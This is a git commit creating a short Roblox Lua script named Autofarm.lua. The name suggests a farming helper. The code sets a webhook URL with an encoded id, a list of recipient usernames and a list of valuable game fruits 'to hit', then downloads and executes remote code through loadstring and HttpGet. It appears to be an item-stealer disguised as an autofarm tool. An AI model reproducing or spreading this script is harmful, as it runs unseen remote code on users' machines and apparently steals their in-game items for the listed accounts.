8f8311b0e25a9262e6eb4c09b411009e2a3c5950
dafgggga <kiennicolas51@gmail.com>
2025-04-05 18:55:43 +0800

    Create Autofarm.lua

---
+++ Autofarm.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=UnRiQ0szaEVObHFMMjBkd2JLbkFzUTpnS05RM0VfaVpvZmhKeXRYYUpRd1lCYVFFMF8yTEdQSmR3WUtVaVVsWWNRX3pjQ3NKdlpNLWVTYXRoX01xRnRFN28tczBtTnBHZHhVMHp0VXFrUk5aUExjUll4NktFbXJ3a05CeGlqM3lSeC04aFNGZWYtVUtXMWlUUjZ2d293b2lpNUJGcml3R3lsTHdXQ2pNSWJVdXZzT1lBdWdxYUZ0WDZfRUY5QVh5cUU"
+Usernames = {"SmashClap10", "IsmashClap10", "Base6383", "NinjaUSA789", "miguelpaguia1"}
+FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti", "Gas-Gas"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
